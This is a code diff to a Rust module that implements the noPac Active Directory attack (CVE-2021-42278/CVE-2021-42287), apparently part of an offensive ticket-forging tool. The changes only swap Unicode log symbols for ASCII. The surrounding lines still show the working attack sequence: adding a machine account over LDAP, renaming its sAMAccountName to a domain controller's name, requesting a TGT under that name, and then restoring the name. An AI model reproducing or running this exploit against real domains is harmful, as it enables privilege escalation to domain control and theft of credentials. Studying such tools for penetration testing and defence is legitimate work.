@@ -1,4 +1,4 @@
-//! noPac attack (CVE-2021-42278 / CVE-2021-42287) — SAMAccountName spoofing
+//! noPac attack (CVE-2021-42278 / CVE-2021-42287) -- SAMAccountName spoofing
 //! combined with Kerberos SID history abuse.
 //!
 //! Attack flow:
@@ -103,7 +103,7 @@ fn format_sid_from_bytes(sid_bytes: &[u8]) -> String {
 pub async fn run_nopac(config: &ForgeConfig, target_dc: &str) -> Result<NoPacResult> {
     info!(
         "{}",
-        "═══ noPac Attack (CVE-2021-42278/CVE-2021-42287) ═══"
+        "=== noPac Attack (CVE-2021-42278/CVE-2021-42287) ==="
             .bold()
             .red()
     );
@@ -119,7 +119,7 @@ pub async fn run_nopac(config: &ForgeConfig, target_dc: &str) -> Result<NoPacRes
     // Step 1: Connect via LDAP and create machine account
     info!(
         "  {} Creating computer account: {computer_name}$ ...",
-        "→".cyan()
+        "->".cyan()
     );
     let password_ref = config.password.as_deref().ok_or_else(|| {
         OverthroneError::TicketForge("Password is required for noPac LDAP operations".into())
@@ -137,11 +137,11 @@ pub async fn run_nopac(config: &ForgeConfig, target_dc: &str) -> Result<NoPacRes
     let computer_dn = ldap
         .add_computer(&format!("{computer_name}$"), &password, Some(&container))
         .await?;
-    info!("  {} Computer created: {computer_dn}", "✓".green());
+    info!("  {} Computer created: {computer_dn}", "[+]".green());
 
     // Step 2: Get domain SID
     let domain_sid = get_domain_sid(&mut ldap).await?;
-    info!("  {} Domain SID: {domain_sid}", "→".cyan());
+    info!("  {} Domain SID: {domain_sid}", "->".cyan());
 
     // Step 3: Modify sAMAccountName to match target DC
     let dc_sam = if target_dc.ends_with('$') {
@@ -149,19 +149,19 @@ pub async fn run_nopac(config: &ForgeConfig, target_dc: &str) -> Result<NoPacRes
     } else {
         format!("{target_dc}$")
     };
-    info!("  {} Setting sAMAccountName to: {dc_sam} ...", "→".cyan());
+    info!("  {} Setting sAMAccountName to: {dc_sam} ...", "->".cyan());
     ldap.modify_replace(&computer_dn, "sAMAccountName", dc_sam.as_bytes())
         .await?;
-    info!("  {} sAMAccountName modified successfully", "✓".green());
+    info!("  {} sAMAccountName modified successfully", "[+]".green());
 
     // Step 4: Request TGT as the DC-named machine
-    info!("  {} Requesting TGT as {dc_sam} ...", "→".cyan());
+    info!("  {} Requesting TGT as {dc_sam} ...", "->".cyan());
     let tgt = request_tgt(&config.dc_ip, &config.domain, &dc_sam, &password, false).await?;
-    info!("  {} TGT obtained for {dc_sam}", "✓".green());
+    info!("  {} TGT obtained for {dc_sam}", "[+]".green());
 
-    // Step 5: Cleanup — restore the sAMAccountName to avoid leaving a
+    // Step 5: Cleanup -- restore the sAMAccountName to avoid leaving a
     // conflicting name on the domain
-    info!("  {} Restoring sAMAccountName ...", "→".cyan());
+    info!("  {} Restoring sAMAccountName ...", "->".cyan());
     let restore_name = format!("{computer_name}$");
     if let Err(e) = ldap
         .modify_replace(&computer_dn, "sAMAccountName", restore_name.as_bytes())
@@ -169,10 +169,10 @@ pub async fn run_nopac(config: &ForgeConfig, target_dc: &str) -> Result<NoPacRes
     {
         warn!("  Could not restore sAMAccountName: {e}");
     } else {
-        info!("  {} sAMAccountName restored", "✓".green());
+        info!("  {} sAMAccountName restored", "[+]".green());
     }
 
-    info!("{}", "═══ noPac Attack Complete ═══".bold().green());
+    info!("{}", "=== noPac Attack Complete ===".bold().green());
     info!("  Computer:   {computer_name}$");
     debug!("  Password:   {password}");
     info!("  Domain SID: {domain_sid}");
